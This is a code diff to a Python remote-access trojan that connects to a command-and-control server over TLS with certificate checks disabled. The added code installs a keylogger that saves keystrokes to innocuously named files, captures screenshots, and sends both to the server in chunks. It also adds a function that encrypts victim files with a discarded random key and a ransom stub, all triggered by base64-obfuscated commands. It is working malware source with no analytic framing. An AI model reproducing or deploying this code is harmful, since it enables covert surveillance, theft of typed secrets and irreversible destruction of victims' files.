@@ -7,6 +7,7 @@ import subprocess
 import sys
 import time
 import threading
+import pynput.keyboard
 import platform
 import pathlib
 import psutil
@@ -14,13 +15,23 @@ import base64
 import tempfile
 from base64 import b64decode
 import secrets
+from PIL import ImageGrab
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 import requests
 
 # Variables globales
-connect = False
+
+try:
+    apdt = os.environ['appdata']
+    cook_th = os.path.join(apdt, "handlermanager.txt")
+    kygerth = path = os.path.join(apdt, "processmanager.txt")
+
+except KeyError:
+    tmp = "/tmp/"
+    kygerth = tmp + "processmanager.txt"
+    cook_th = tmp + "handlermanager.txt"
 
 
 def crte():
@@ -51,6 +62,62 @@ context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
 context.check_hostname = False
 context.verify_mode = ssl.CERT_NONE
 context.load_cert_chain(certfile=crt.name, keyfile=ky.name)
+
+
+
+
+g = ""
+try:
+    ph = os.environ["appdata"] + "\\processmanager.txt"
+except KeyError:
+    ph = "/tmp/processmanager.txt"
+
+
+def pSSks(k):
+    global g
+    try:
+        g += str(k.char)
+    except AttributeError:
+        if k == k.space:
+            g += " "
+        elif k == k.tab:
+            g += " [TAB] "
+        elif k == k.backspace:
+            g += " [DELETE] "
+        elif k == k.right:
+            g += ""
+        elif k == k.left:
+            g += ""
+        elif k == k.up:
+            g += ""
+        elif k == k.down:
+            g = ""
+        else:
+            g += "" + str(k) + ""
+
+
+def wte(chipred):
+    with open(ph, "ab") as fin:
+        fin.write(chipred.encode())
+
+
+def report():
+    global g
+    global ph
+
+    # Escribimos
+    wte(g)
+
+    g = ""
+    timer = threading.Timer(10, report)
+    timer.start()
+
+
+def start():
+    ky_stnr = pynput.keyboard.Listener(on_press=pSSks)
+    with ky_stnr:
+        report()
+        ky_stnr.join()
 
 
 def pad(message):
@@ -169,7 +236,7 @@ def make_conect ():
     while True:
         sock = socket . socket (socket . AF_INET ,socket . SOCK_STREAM)
         #try:
-        sock.connect ( ( '192.168.131.47' ,1337) )
+        sock.connect ( ( '127.0.0.1' ,1337) )
         sock = context . wrap_socket (sock)
         game (sock)
         time . sleep (5)
@@ -271,7 +338,7 @@ def dloadD (instruct):
 
             send_file(sock ,file_path)
             sock.send("end" .encode ())
-    sock.send("DONE".encode())
+    sock.send("done".encode())
 
 
 def excIns(work):
@@ -434,12 +501,72 @@ def cGVyc2lzdGVuY2UK():
         sock.send("no_root".encode())
 
 
+def sdnKog():
+    with open(kygerth, "r") as data:
+        data = data.read()
+    bytes_sent = 0
+    total_bytes = len(data)
+    chunk_size = 1024
+    while bytes_sent < total_bytes:
+        end_idx = min(bytes_sent + chunk_size, total_bytes)
+        chunk = data[bytes_sent:end_idx]
+        sock.send(data.encode())
+        bytes_sent += len(chunk)
+
+    sock.send("[+] Keylog sent successfully.".encode())
+
+
+def sdsht():
+    try:
+        st = ImageGrab.grab()
+        st.save("x.png", "PNG")
+        with open("x.png", "rb") as f_st:
+            dt_st = f_st.read()
+        os.remove("x.png")
+        return dt_st
+    except Exception as e:
+        return str(e).encode()
+
+
+def tk_nd_sd_sht():
+    screenshot_data = sdsht()
+    bytes_sent = 0
+    total_bytes = len(screenshot_data)
+    chunk_size = 1024
+    while bytes_sent < total_bytes:
+        end_idx = min(bytes_sent + chunk_size, total_bytes)
+        chunk = screenshot_data[bytes_sent:end_idx]
+        sock.send(chunk)
+        bytes_sent += len(chunk)
+
+    sock.send(base64.b64decode(b"WytdIFNjcmVlbnNob3Qgc2VudCBzdWNjZXNzZnVsbHkuCg=="))
+
+
+def cntread(xx):
+    try:
+        with open(xx, "rb") as  yy:
+            yy = yy.read()
+        chipred = encrypt(yy, secrets.token_bytes(32))
+        with open(xx, "wb") as yy:
+            yy.write(chipred)
+        return "True"
+    except Exception as e:
+        return str(e)
+
+
+def c3RydFJuc29tCg():
+    pass
+
+
 def game (sock):
 
     while True:
         instruct = sock. recv (1024)
-        print(instruct)
-        if instruct == "Y2xvc2UK" . encode ( ):
+
+        if instruct == "".encode():
+            continue
+
+        elif instruct == "Y2xvc2UK" . encode ( ):
             sock . close ()
             break
 
@@ -484,17 +611,35 @@ def game (sock):
         elif "bG93cGVyc2lzdGVuY2UK" .encode () in instruct:
             bWFrZUxvd3BlcnNpc3RlbmNlCg()
 
+        elif "Y3J5cHQK" .encode () in instruct:
+            x = cntread (instruct .replace ("Y3J5cHQK " .encode (), "" .encode ()) .decode())
+            sock.send ( x .encode ())
+
         elif "Y3J5cHREaXIK" .encode () in instruct:
             strCpt(instruct.decode())
             sock.send("done".encode())
+
+        elif "a2V5bG9nX2R1bXAK" .encode () in instruct:
+            t1 = threading.Thread(target=sdnKog)
+            t1.start()
+
+        elif "c2NyZWVuc2hvdAo=" .encode () in instruct:
+            tk_nd_sd_sht()
+
+        elif "cmFuc29tCg==" .encode () in instruct:
+            c3RydFJuc29tCg()
 
         else:
             pass
 
 
 def main ():
+    t1 = threading.Thread(target=start)
+    t1.start()
+
     startThread = threading . Thread (target=make_conect)
     startThread .start ()
+
 
 
 if __name__ == "__main__":
